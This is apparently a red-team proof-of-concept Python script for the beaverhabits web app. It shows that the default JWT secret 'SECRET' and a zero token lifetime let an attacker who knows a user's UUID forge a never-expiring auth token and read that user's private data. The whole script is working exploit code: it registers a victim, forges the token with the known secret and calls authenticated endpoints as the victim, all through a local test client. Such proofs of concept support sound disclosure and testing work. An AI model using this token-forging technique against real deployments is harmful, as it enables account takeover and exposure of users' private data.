"""Red-team proof of concept: forge a non-expiring auth JWT with the default secret.

Demonstrates that a deployment using the default JWT_SECRET="SECRET" lets an
attacker who learns a user's UUID authenticate as that user forever, with no
password and no expiry. The victim UUID is logged at registration and shipped
to Sentry when SENTRY_DSN is set (send_default_pii=True).

Run: uv run python poc_takeover.py
"""
import os

os.environ.setdefault("JWT_SECRET", "SECRET")
os.environ.setdefault("NICEGUI_STORAGE_SECRET", "dev")

import jwt
from fastapi.testclient import TestClient

from beaverhabits.configs import settings
from beaverhabits.main import app

assert settings.JWT_SECRET == "SECRET", "expected default secret"
assert settings.JWT_LIFETIME_SECONDS == 0, "expected zero lifetime (no exp)"


def main() -> None:
    client = TestClient(app)
    with client:
        email = "victim@example.com"
        password = "victim-strong-pw"

        # 1. Victim registers. The response body is UserRead, which includes id.
        r = client.post("/auth/register", json={"email": email, "password": password})
        if r.status_code == 201:
            victim_uuid = r.json()["id"]
        else:
            r = client.post(
                "/auth/login",
                data={"grant_type": "password", "username": email, "password": password},
                headers={"content-type": "application/x-www-form-urlencoded"},
            )
            victim_uuid = client.get(
                "/users/me",
                headers={"Authorization": f"Bearer {r.json()['access_token']}"},
            ).json()["id"]
        print(f"victim uuid (leaked at registration): {victim_uuid}")

        # 2. Attacker forges an auth JWT using the public default secret.
        #    No password, no email, no expiry (lifetime=0 omits the exp claim).
        forged = jwt.encode(
            {"sub": victim_uuid, "aud": "fastapi-users:auth"},
            "SECRET",
            algorithm="HS256",
        )
        decoded = jwt.decode(forged, "SECRET", audience=["fastapi-users:auth"], algorithms=["HS256"])
        print(f"forged token payload: {decoded}")
        assert "exp" not in decoded, "token should never expire"

        # 3. Attacker authenticates as the victim and reads private data.
        r = client.get("/users/me", headers={"Authorization": f"Bearer {forged}"})
        print(f"GET /users/me -> {r.status_code} {r.json().get('email')}")
        assert r.status_code == 200 and r.json()["email"] == email

        r = client.get("/api/v1/habits", headers={"Authorization": f"Bearer {forged}"})
        print(f"GET /api/v1/habits -> {r.status_code}")
        assert r.status_code in (200, 404)

        print("\n[OK] forged a non-expiring token and impersonated the victim")


if __name__ == "__main__":
    main()
